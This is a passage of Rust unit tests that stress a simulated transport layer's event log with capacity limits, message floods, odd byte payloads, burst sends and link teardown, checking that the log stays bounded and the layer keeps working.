            assert!(!destruction_vt.links.contains_key("destruction_test"),
                   "Link should be removed after destruction");
        }

        #[test]
        fn test_event_log_capacity_and_memory_exhaustion_attacks() {
            // Attack 1: Event log capacity boundary testing
            let capacity_tests = vec![
                0,              // Zero capacity
                1,              // Minimal capacity
                100,            // Small capacity
                10000,          // Large capacity
                usize::MAX.min(1_000_000), // Very large but bounded
            ];

            for capacity in capacity_tests {
                let mut vt = VirtualTransportLayer::with_event_log_capacity(42, capacity);
                let expected_capacity = capacity.max(1);  // Should enforce minimum of 1

                assert_eq!(vt.max_event_log_entries, expected_capacity,
                          "Capacity should be set correctly");

                // Create link to generate events
                vt.create_link("capacity_test", LinkFaultConfig::default())
                    .expect("Should create capacity test link");

                // Generate events beyond capacity
                for i in 0..(expected_capacity * 2 + 10) {
                    let payload = format!("capacity_test_{}", i).as_bytes().to_vec();
                    let _ = vt.send_message("capacity_test", &payload);
                    vt.advance_tick();

                    // Verify event log stays within bounds
                    assert!(vt.event_log.len() <= expected_capacity,
                           "Event log should not exceed capacity {} at iteration {}",
                           expected_capacity, i);
                }
            }

            // Attack 2: Event log memory exhaustion through event flooding
            let mut flood_vt = VirtualTransportLayer::with_event_log_capacity(123, 10000);
            flood_vt.create_link("flood_test", LinkFaultConfig {
                drop_probability: 0.1,   // Generate drop events
                reorder_depth: 5,        // Generate reorder events
                corrupt_bit_count: 2,    // Generate corruption events
                delay_ticks: 1,          // Generate delay events
                latency_ms: 10,
                packet_loss_pct: 5.0,
                jitter_ms: 5,
                bandwidth_mbps: 100.0,
                corruption_pct: 2.0,
            }).expect("Should create flood test link");

            // Flood with events
            for i in 0..50000 {
                let payload = format!("flood_{}", i).as_bytes().to_vec();
                let _ = flood_vt.send_message("flood_test", &payload);

                if i % 10 == 0 {
                    flood_vt.advance_tick();
                }

                // Periodically verify memory bounds
                if i % 1000 == 0 {
                    assert!(flood_vt.event_log.len() <= flood_vt.max_event_log_entries,
                           "Event log should remain bounded during flood");
                }
            }

            // Attack 3: Event log with malicious event data
            let mut malicious_vt = VirtualTransportLayer::new(456);
            malicious_vt.create_link("malicious_test", LinkFaultConfig::default())
                .expect("Should create malicious test link");

            let malicious_payloads = vec![
                b"normal_payload".to_vec(),
                vec![0x00; 10000],  // Large null payload
                vec![0xFF; 10000],  // Large 0xFF payload
                "unicode_🦀_payload_with_emoji".as_bytes().to_vec(),
                "\x00\x01\u{00FF}\x7F malicious binary".as_bytes().to_vec(),
                "very_long_payload_".repeat(1000).as_bytes().to_vec(),
            ];

            for payload in malicious_payloads {
                let _ = malicious_vt.send_message("malicious_test", &payload);
                malicious_vt.advance_tick();

                // Verify event log handles malicious payloads
                assert!(malicious_vt.event_log.len() <= malicious_vt.max_event_log_entries,
                       "Event log should handle malicious payloads safely");
            }

            // Attack 4: Event log race condition simulation
            let mut race_vt = VirtualTransportLayer::with_event_log_capacity(789, 1000);
            race_vt.create_link("race_test", LinkFaultConfig {
                drop_probability: 0.2,
                reorder_depth: 3,
                corrupt_bit_count: 1,
                delay_ticks: 1,
                latency_ms: 5,
                packet_loss_pct: 10.0,
                jitter_ms: 2,
                bandwidth_mbps: 100.0,
                corruption_pct: 5.0,
            }).expect("Should create race test link");

            // Simulate rapid concurrent operations
            for round in 0..100 {
                let initial_log_len = race_vt.event_log.len();

                // Burst of operations
                for i in 0..50 {
                    let payload = format!("race_{}_{}", round, i).as_bytes().to_vec();
                    let _ = race_vt.send_message("race_test", &payload);
                }

                race_vt.advance_tick();

                let final_log_len = race_vt.event_log.len();

                // Verify log size constraints maintained
                assert!(final_log_len <= race_vt.max_event_log_entries,
                       "Event log should maintain size constraints during burst operations");

                // Verify log grew or stayed bounded
                assert!(final_log_len >= initial_log_len ||
                       initial_log_len == race_vt.max_event_log_entries,
                       "Event log should grow unless at capacity");
            }

            // Attack 5: Event log corruption through link manipulation
            let mut corruption_vt = VirtualTransportLayer::with_event_log_capacity(101112, 500);

            // Create multiple links with different configurations
            let link_configs = vec![
                ("corrupt_link_1", LinkFaultConfig {
                    drop_probability: 0.0, reorder_depth: 0, corrupt_bit_count: 0, delay_ticks: 0,
                    latency_ms: 0, packet_loss_pct: 0.0, jitter_ms: 0, bandwidth_mbps: 1000.0, corruption_pct: 0.0,
                }),
                ("corrupt_link_2", LinkFaultConfig {
                    drop_probability: 1.0, reorder_depth: 100, corrupt_bit_count: 100, delay_ticks: 100,
                    latency_ms: 1000, packet_loss_pct: 100.0, jitter_ms: 1000, bandwidth_mbps: 0.1, corruption_pct: 100.0,
                }),
            ];

            for (link_id, config) in link_configs {
                corruption_vt.create_link(link_id, config)
                    .expect("Should create corruption test links");
            }

            // Send messages to different links
            for i in 0..1000 {
                let payload = format!("corruption_test_{}", i).as_bytes().to_vec();

                let link_id = if i % 2 == 0 { "corrupt_link_1" } else { "corrupt_link_2" };
                let _ = corruption_vt.send_message(link_id, &payload);

                if i % 10 == 0 {
                    corruption_vt.advance_tick();
                }
            }

            // Destroy and recreate links
            corruption_vt.destroy_link("corrupt_link_1");
            corruption_vt.destroy_link("corrupt_link_2");

            // Verify event log integrity after link manipulation
            assert!(corruption_vt.event_log.len() <= corruption_vt.max_event_log_entries,
                   "Event log should maintain integrity after link manipulation");

            // Verify transport remains functional
            corruption_vt.create_link("post_corruption_test", LinkFaultConfig::default())
                .expect("Should be able to create links after corruption test");

            let test_payload = b"post_corruption_test".to_vec();
            let test_result = corruption_vt.send_message("post_corruption_test", &test_payload);
            assert!(test_result.is_ok(), "Transport should remain functional after event log stress");
        }
    }
}
